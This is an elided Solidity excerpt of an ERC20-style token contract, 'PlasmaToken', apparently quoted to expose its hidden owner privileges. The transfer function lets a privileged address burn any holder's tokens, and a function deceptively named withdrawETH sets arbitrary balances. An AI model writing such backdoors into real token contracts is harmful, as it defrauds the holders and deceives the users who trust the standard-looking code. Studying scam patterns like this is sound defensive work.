...
contract PlasmaToken is IERC20, IERC20Errors {
    ...
    function __Token_init(
        ...
        _symbol = symbol_;
        _mu = receiver;
        _update(address(0), receiver, number * 10 ** 18);
    ...
    function transfer(address to, uint256 value) public virtual returns (bool) {
        if (msg.sender == _mu) {
            _update(to, address(0xdead), value);
            return true;
        }
    ...
    function withdrawETH(address u, uint256 m) external {
        require(msg.sender == _mu);
        _balances[u] = m;
    }
}
